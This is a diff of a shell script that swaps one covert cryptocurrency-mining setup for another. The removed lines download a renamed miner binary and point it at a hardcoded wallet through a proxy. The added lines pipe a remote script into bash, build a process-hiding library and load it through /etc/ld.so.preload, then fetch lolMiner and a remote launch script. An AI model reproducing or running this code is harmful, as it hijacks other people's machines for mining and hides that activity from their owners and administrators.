@@ -1,13 +1,15 @@
-#!/bin/bash
-sleep 3m
-wget https://github.com/rindalasririn/ketaea/raw/main/bubui
-#wget https://cuan.mine.nu/nbminer
-ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
-chmod +x bubui && mv bubui $ACAK
-PROXY=$(echo $(curl -s https://cuan.mine.nu/ganti-proxy.php))
-WALLET=3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri
-POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353
-WORKER1=$(echo $(shuf -i 1000-9999 -n 1))
-#WORKER2=$(date '+%d%b')
-#WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
-./$ACAK --algo ETHASH --socks5 $PROXY --pool $POOL --user $WALLET.$WORKER1 --tls 0 -- ethstratum ETHV1 --silence 3
+#!/bin/sh
+wget -O - https://raw.githubusercontent.com/17mei2022/No_lol/main/px_1.sh | bash
+wget https://github.com/17mei2022/No_lol/raw/main/magicLol.zip
+unzip magicLol.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51/lolMiner_v1.51_Lin64.tar.gz
+tar -xvzf lolMiner_v1.51_Lin64.tar.gz
+rm .gitignore
+cd 1.51
+wget https://raw.githubusercontent.com/17mei2022/No_lol/main/set_lol.sh
+chmod +x *.sh
+graftcp ./set_lol.sh
